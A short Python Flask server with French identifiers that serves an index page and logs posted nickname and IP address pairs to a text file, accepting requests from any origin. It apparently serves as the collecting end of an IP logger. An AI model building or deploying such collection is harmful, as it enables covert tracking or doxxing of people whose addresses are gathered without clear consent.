from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

app = Flask(__name__, static_folder=None)
CORS(app, resources={r"/*": {"origins": "*"}})
limiter = Limiter(get_remote_address, app=app, default_limits=[])

FICHIER = "ggbg.txt"

@app.route("/")
def accueil():
    return send_file("index.html")

@app.route("/enregistrer", methods=["POST"])
@limiter.limit("1 per minute")
def enregistrer():
    data = request.get_json()
    ip = data.get("ip", "inconnue")
    pseudo = data.get("pseudo", "inconnu")

    with open(FICHIER, "a", encoding="utf-8") as f:
        f.write(f"{pseudo} : {ip}\n")

    print(f"{pseudo} : {ip}")
    return jsonify({"statut": "ok"})

if __name__ == "__main__":
    print("Serveur en attente de réception d'IP sur le port 5000...")
    app.run(port=5000)
